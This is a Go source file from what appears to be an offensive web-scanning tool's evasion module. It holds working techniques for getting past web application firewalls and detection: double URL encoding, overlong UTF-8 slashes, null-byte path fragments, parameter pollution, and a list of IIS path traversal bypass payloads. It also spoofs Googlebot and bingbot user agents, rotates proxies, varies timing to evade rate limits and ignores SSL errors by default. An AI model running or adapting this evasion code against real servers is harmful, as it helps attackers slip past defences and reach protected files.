package evasion

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	mathRand "math/rand"
	"net/url"
	"strings"
	"time"
)

// EvasionTechnique evasion technique interface
type EvasionTechnique interface {
	Apply(input string) string
	Name() string
	Description() string
}

// EvasionEngine evasion engine structure
type EvasionEngine struct {
	techniques []EvasionTechnique
	userAgents []string
	proxies    []string
}

// NewEvasionEngine creates a new evasion engine
func NewEvasionEngine() *EvasionEngine {
	engine := &EvasionEngine{}
	engine.initTechniques()
	engine.initUserAgents()
	return engine
}

// initTechniques initializes evasion techniques
func (e *EvasionEngine) initTechniques() {
	e.techniques = []EvasionTechnique{
		&URLEncoding{},
		&DoubleURLEncoding{},
		&UnicodeEncoding{},
		&HTMLEncoding{},
		&CaseVariation{},
		&PathFragmentation{},
		&ParameterPollution{},
		&VerbTampering{},
		&HeaderObfuscation{},
		&TimingVariation{},
	}
}

// initUserAgents initializes user agent list
func (e *EvasionEngine) initUserAgents() {
	e.userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
		"Wget/1.20.3 (linux-gnu)",
		"curl/7.68.0",
	}
}

// ApplyRandomEvasion applies a random evasion technique
func (e *EvasionEngine) ApplyRandomEvasion(input string) string {
	if len(e.techniques) == 0 {
		return input
	}
	
	technique := e.techniques[mathRand.Intn(len(e.techniques))]
	return technique.Apply(input)
}

// ApplyMultipleEvasions applies multiple evasion techniques
func (e *EvasionEngine) ApplyMultipleEvasions(input string, count int) string {
	result := input
	usedTechniques := make(map[string]bool)
	
	for i := 0; i < count && len(usedTechniques) < len(e.techniques); i++ {
		technique := e.techniques[mathRand.Intn(len(e.techniques))]
		if !usedTechniques[technique.Name()] {
			result = technique.Apply(result)
			usedTechniques[technique.Name()] = true
		}
	}
	
	return result
}

// GetRandomUserAgent returns a random user agent
func (e *EvasionEngine) GetRandomUserAgent() string {
	return e.userAgents[mathRand.Intn(len(e.userAgents))]
}

// GetRandomDelay returns a random delay
func (e *EvasionEngine) GetRandomDelay(min, max time.Duration) time.Duration {
	if max <= min {
		return min
	}
	return min + time.Duration(mathRand.Int63n(int64(max-min)))
}

// URLEncoding URL encoding evasion technique
type URLEncoding struct{}

func (u *URLEncoding) Name() string {
	return "URL Encoding"
}

func (u *URLEncoding) Description() string {
	return "Standard URL encoding for special characters"
}

func (u *URLEncoding) Apply(input string) string {
	return url.QueryEscape(input)
}

// DoubleURLEncoding double URL encoding evasion technique
type DoubleURLEncoding struct{}

func (d *DoubleURLEncoding) Name() string {
	return "Double URL Encoding"
}

func (d *DoubleURLEncoding) Description() string {
	return "Double URL encoding to bypass filters"
}

func (d *DoubleURLEncoding) Apply(input string) string {
	encoded := url.QueryEscape(input)
	return url.QueryEscape(encoded)
}

// UnicodeEncoding Unicode encoding evasion technique
type UnicodeEncoding struct{}

func (u *UnicodeEncoding) Name() string {
	return "Unicode Encoding"
}

func (u *UnicodeEncoding) Description() string {
	return "Unicode encoding for character obfuscation"
}

func (u *UnicodeEncoding) Apply(input string) string {
	result := ""
	for _, char := range input {
		if char == '/' {
			result += "%c0%af" // Unicode encoding for /
		} else if char == '\\' {
			result += "%c1%9c" // Unicode encoding for \
		} else if char == '.' {
			result += "%c0%2e" // Unicode encoding for .
		} else {
			result += string(char)
		}
	}
	return result
}

// HTMLEncoding HTML encoding evasion technique
type HTMLEncoding struct{}

func (h *HTMLEncoding) Name() string {
	return "HTML Encoding"
}

func (h *HTMLEncoding) Description() string {
	return "HTML entity encoding for character obfuscation"
}

func (h *HTMLEncoding) Apply(input string) string {
	result := ""
	for _, char := range input {
		switch char {
		case '<':
			result += "&lt;"
		case '>':
			result += "&gt;"
		case '&':
			result += "&amp;"
		case '"':
			result += "&quot;"
		case '\'':
			result += "&#x27;"
		case '/':
			result += "&#x2F;"
		default:
			result += string(char)
		}
	}
	return result
}

// CaseVariation case variation evasion technique
type CaseVariation struct{}

func (c *CaseVariation) Name() string {
	return "Case Variation"
}

func (c *CaseVariation) Description() string {
	return "Random case variation to bypass case-sensitive filters"
}

func (c *CaseVariation) Apply(input string) string {
	result := ""
	for _, char := range input {
		if mathRand.Intn(2) == 0 {
			result += strings.ToUpper(string(char))
		} else {
			result += strings.ToLower(string(char))
		}
	}
	return result
}

// PathFragmentation path fragmentation evasion technique
type PathFragmentation struct{}

func (p *PathFragmentation) Name() string {
	return "Path Fragmentation"
}

func (p *PathFragmentation) Description() string {
	return "Fragment paths with null bytes and special characters"
}

func (p *PathFragmentation) Apply(input string) string {
	fragments := []string{
		"./",
		"../",
		".\\",
		"..\\",
		"%00",
		"%2e%2e%2f",
		"%2e%2e%5c",
	}
	
	fragment := fragments[mathRand.Intn(len(fragments))]
	return fragment + input
}

// ParameterPollution HTTP parameter pollution evasion technique
type ParameterPollution struct{}

func (p *ParameterPollution) Name() string {
	return "Parameter Pollution"
}

func (p *ParameterPollution) Description() string {
	return "HTTP parameter pollution to confuse parsers"
}

func (p *ParameterPollution) Apply(input string) string {
	if strings.Contains(input, "=") {
		parts := strings.Split(input, "=")
		if len(parts) == 2 {
			return fmt.Sprintf("%s=dummy&%s=%s&%s=fake", parts[0], parts[0], parts[1], parts[0])
		}
	}
	return input
}

// VerbTampering HTTP verb tampering evasion technique
type VerbTampering struct{}

func (v *VerbTampering) Name() string {
	return "Verb Tampering"
}

func (v *VerbTampering) Description() string {
	return "HTTP method override headers"
}

func (v *VerbTampering) Apply(input string) string {
	// This technique is applied at the HTTP header level
	return input
}

// HeaderObfuscation header obfuscation evasion technique
type HeaderObfuscation struct{}

func (h *HeaderObfuscation) Name() string {
	return "Header Obfuscation"
}

func (h *HeaderObfuscation) Description() string {
	return "Obfuscate HTTP headers to bypass detection"
}

func (h *HeaderObfuscation) Apply(input string) string {
	// This technique is applied at the HTTP header level
	return input
}

// TimingVariation timing variation evasion technique
type TimingVariation struct{}

func (t *TimingVariation) Name() string {
	return "Timing Variation"
}

func (t *TimingVariation) Description() string {
	return "Vary request timing to avoid rate limiting"
}

func (t *TimingVariation) Apply(input string) string {
	// This technique affects timing, not the input itself
	return input
}

// RequestFragmentation request fragmentation utilities
type RequestFragmentation struct {
	ChunkSize int
}

// FragmentRequest fragments HTTP request into chunks
func (r *RequestFragmentation) FragmentRequest(data []byte) [][]byte {
	if r.ChunkSize <= 0 {
		r.ChunkSize = 8
	}
	
	var chunks [][]byte
	for i := 0; i < len(data); i += r.ChunkSize {
		end := i + r.ChunkSize
		if end > len(data) {
			end = len(data)
		}
		chunks = append(chunks, data[i:end])
	}
	
	return chunks
}

// CustomEvasionPayloads custom evasion payloads
type CustomEvasionPayloads struct {
	IISSpecific []string
}

// NewCustomEvasionPayloads creates new custom evasion payloads
func NewCustomEvasionPayloads() *CustomEvasionPayloads {
	return &CustomEvasionPayloads{
		IISSpecific: []string{
			// IIS-specific path traversal evasions
			"..%255c",
			"..%c0%af",
			"..%c1%9c",
			".%2e%2f",
			".%2e%5c",
			"..%252f",
			"..%252e",
			"..%u002f",
			"..%u005c",
			// IIS Unicode normalization bypasses
			"%c0%2e%c0%2e%c0%af",
			"%c0%2e%c0%2e%c1%9c",
			// IIS null byte injection
			"..%00%2f",
			"..%00%5c",
			// IIS alternate data streams
			"::$DATA",
			"::$INDEX_ALLOCATION",
			// IIS long filename attacks
			strings.Repeat("A", 255) + ".txt",
		},
	}
}

// GetRandomIISPayload returns random IIS payload
func (c *CustomEvasionPayloads) GetRandomIISPayload() string {
	return c.IISSpecific[mathRand.Intn(len(c.IISSpecific))]
}

// ProxyRotation proxy rotation utilities
type ProxyRotation struct {
	Proxies     []string
	CurrentIdx  int
}

// NewProxyRotation creates new proxy rotation
func NewProxyRotation(proxies []string) *ProxyRotation {
	return &ProxyRotation{
		Proxies:    proxies,
		CurrentIdx: 0,
	}
}

// GetNextProxy returns the next proxy
func (p *ProxyRotation) GetNextProxy() string {
	if len(p.Proxies) == 0 {
		return ""
	}
	
	proxy := p.Proxies[p.CurrentIdx]
	p.CurrentIdx = (p.CurrentIdx + 1) % len(p.Proxies)
	return proxy
}

// GetRandomProxy returns random proxy
func (p *ProxyRotation) GetRandomProxy() string {
	if len(p.Proxies) == 0 {
		return ""
	}
	
	return p.Proxies[mathRand.Intn(len(p.Proxies))]
}

// SSLPinningBypass SSL certificate pinning bypass
type SSLPinningBypass struct {
	IgnoreSSLErrors bool
	CustomCerts     []string
}

// NewSSLPinningBypass creates new SSL pinning bypass
func NewSSLPinningBypass() *SSLPinningBypass {
	return &SSLPinningBypass{
		IgnoreSSLErrors: true,
		CustomCerts:     []string{},
	}
}

// SessionManager session management for evasion
type SessionManager struct {
	Sessions map[string]string
}

// NewSessionManager creates new session manager
func NewSessionManager() *SessionManager {
	return &SessionManager{
		Sessions: make(map[string]string),
	}
}

// GenerateRandomSession creates random session
func (s *SessionManager) GenerateRandomSession() string {
	bytes := make([]byte, 16)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

// GetSession returns session
func (s *SessionManager) GetSession(key string) string {
	if session, exists := s.Sessions[key]; exists {
		return session
	}
	
	session := s.GenerateRandomSession()
	s.Sessions[key] = session
	return session
}

// AdvancedEvasionConfig advanced evasion configuration
type AdvancedEvasionConfig struct {
	EnableUserAgentRotation bool
	EnableProxyRotation     bool
	EnableTimingVariation   bool
	EnableHeaderObfuscation bool
	EnableSSLBypass         bool
	MinDelay                time.Duration
	MaxDelay                time.Duration
	MaxRetries              int
}

// DefaultAdvancedEvasionConfig default advanced evasion config
func DefaultAdvancedEvasionConfig() *AdvancedEvasionConfig {
	return &AdvancedEvasionConfig{
		EnableUserAgentRotation: true,
		EnableProxyRotation:     false,
		EnableTimingVariation:   true,
		EnableHeaderObfuscation: true,
		EnableSSLBypass:         true,
		MinDelay:                100 * time.Millisecond,
		MaxDelay:                2 * time.Second,
		MaxRetries:              3,
	}
}
